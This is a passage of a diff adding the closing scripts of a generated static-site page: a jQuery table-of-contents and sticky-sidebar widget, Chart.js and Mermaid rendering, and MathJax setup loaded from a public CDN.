+            $tocUl.append($('<li></li>').addClass('toc-' + $this.prop('tagName').toLowerCase())
+              .append($('<a></a>').text($this.text()).attr('href', '#' + $this.prop('id'))));
+          });
+          $tocLi = $tocUl.children('li');
+          $tocUl.on('click', 'a', function(e) {
+            e.preventDefault();
+            var $this = $(this);
+            scrolling = true;
+            setState($this.parent());
+            $scroller.scrollToAnchor($this.attr('href'), 400, function() {
+              scrolling = false;
+            });
+          });
+        }
+        hasRendered = true;
+      }
+      function init() {
+        var interval, timeout;
+        if(!hasInit) {
+          render(); calc(); setState(null, scrolling);
+          // run calc every 100 millisecond
+          interval = setInterval(function() {
+            calc();
+          }, 100);
+          timeout = setTimeout(function() {
+            clearInterval(interval);
+          }, 45000);
+          window.pageLoad.then(function() {
+            setTimeout(function() {
+              clearInterval(interval);
+              clearTimeout(timeout);
+            }, 3000);
+          });
+          $scrollTarget.on('scroll', function() {
+            disabled || setState(null, scrolling);
+          });
+          $window.on('resize', window.throttle(function() {
+            if (!disabled) {
+              render(); calc(); setState(null, scrolling);
+            }
+          }, 100));
+        }
+        hasInit = true;
+      }
+
+      setOptions(options);
+      if (!disabled) {
+        init();
+      }
+      $window.on('resize', window.throttle(function() {
+        init();
+      }, 200));
+      return {
+        setOptions: setOptions
+      };
+    }
+    $.fn.toc = toc;
+  });
+})();
+/*(function () {
+
+})();*/
+</script><script>
+  /* toc must before affix, since affix need to konw toc' height. */(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  var TOC_SELECTOR = window.TEXT_VARIABLES.site.toc.selectors;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    var $window = $(window);
+    var $articleContent = $('.js-article-content');
+    var $tocRoot = $('.js-toc-root'), $col2 = $('.js-col-aside');
+    var toc;
+    var tocDisabled = false;
+    var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+    var hasToc = $articleContent.find(TOC_SELECTOR).length > 0;
+
+    function disabled() {
+      return $col2.css('display') === 'none' || !hasToc;
+    }
+
+    tocDisabled = disabled();
+
+    toc = $tocRoot.toc({
+      selectors: TOC_SELECTOR,
+      container: $articleContent,
+      scrollTarget: hasSidebar ? '.js-page-main' : null,
+      scroller: hasSidebar ? '.js-page-main' : null,
+      disabled: tocDisabled
+    });
+
+    $window.on('resize', window.throttle(function() {
+      tocDisabled = disabled();
+      toc && toc.setOptions({
+        disabled: tocDisabled
+      });
+    }, 100));
+
+  });
+})();
+(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    var $window = $(window), $pageFooter = $('.js-page-footer');
+    var $pageAside = $('.js-page-aside');
+    var affix;
+    var tocDisabled = false;
+    var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+
+    affix = $pageAside.affix({
+      offsetBottom: $pageFooter.outerHeight(),
+      scrollTarget: hasSidebar ? '.js-page-main' : null,
+      scroller: hasSidebar ? '.js-page-main' : null,
+      scroll: hasSidebar ? $('.js-page-main').children() : null,
+      disabled: tocDisabled
+    });
+
+    $window.on('resize', window.throttle(function() {
+      affix && affix.setOptions({
+        disabled: tocDisabled
+      });
+    }, 100));
+
+    window.pageAsideAffix = affix;
+  });
+})();
+</script><script>
+  window.Lazyload.js(['https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js', 'https://cdn.bootcss.com/Chart.js/2.7.2/Chart.bundle.min.js'], function() {
+    var $canvas = null, $this = null, _ctx = null, _text = '';
+    $('.language-chart').each(function(){
+      $this = $(this);
+      $canvas = $('<canvas></canvas>');
+      _text = $this.text();
+      $this.text('').append($canvas);
+      _ctx = $canvas.get(0).getContext('2d');
+      (_ctx && _text) && (new Chart(_ctx, JSON.parse(_text)) && $this.attr('data-processed', true));
+    });
+  });
+</script>
+<script type="text/x-mathjax-config">
+	var _config = { tex2jax: {
+		inlineMath: [['$','$'], ['\\(','\\)']]
+	}};_config.TeX = { equationNumbers: { autoNumber: "all" } };MathJax.Hub.Config(_config);
+</script>
+<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
+  window.Lazyload.js('https://cdn.bootcss.com/mermaid/8.0.0-rc.8/mermaid.min.js', function() {
+    mermaid.initialize({
+      startOnLoad: true
+    });
+    mermaid.init(undefined, '.language-mermaid');
+  });
+</script>
+
+    </div>
+    <script>(function () {
+  var $root = document.getElementsByClassName('root')[0];
+  if (window.hasEvent('touchstart')) {
+    $root.dataset.isTouch = true;
+    document.addEventListener('touchstart', function(){}, false);
+  }
+})();
+</script>
+  </body>
+</html>
+
